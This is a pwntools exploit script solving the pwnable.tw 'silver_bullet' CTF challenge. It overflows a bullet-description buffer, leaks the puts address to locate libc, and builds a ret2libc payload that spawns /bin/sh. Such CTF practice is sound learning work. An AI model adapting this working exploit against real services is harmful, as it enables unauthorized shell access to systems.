#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level = "debug"
pwn_file="./silver_bullet"
elf=ELF(pwn_file)

context.arch='i386'
os.environ['LD_LIBRARY_PATH'] = '/media/psf/CTF/pwnabletw/SilverBullet'
libc=ELF("./libc.so.6")

if len(sys.argv) == 1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10103)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def create(descrip=''):
    r.sendlineafter("Your choice :",'1')
    r.sendlineafter("Give me your description of bullet :",descrip)
    r.recvuntil("Good luck !!")

def powerup(descrip=''):
    r.sendlineafter("Your choice :",'2')
    r.sendlineafter("Give me your another description of bullet :", descrip)
    r.recvuntil("Enjoy it !")

def beat():
    r.sendlineafter("Your choice :",'3')

create('a'*0x2c)
powerup('a'*0x4) # dest+12 -> 4, 后续可再读0x2c个


payload = 'a'*3 + p32(0xffffffff) + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
powerup(payload)

beat()
beat()
r.recvuntil("Oh ! You win !!\n")
puts_addr = u32(r.recv(4))
libc.address = puts_addr - libc.sym['puts']

info("libc.address: %16x", libc.address)
system = libc.sym['system']
binsh = list(libc.search('/bin/sh'))[0]


create('a'*0x2c)
powerup('a'*0x4)
payload = 'a'*3 + p32(0xffffffff) + p32(system) + 'a'*4 + p32(binsh)
powerup(payload)
beat()
beat()
r.recvuntil("Oh ! You win !!\n")


r.interactive()
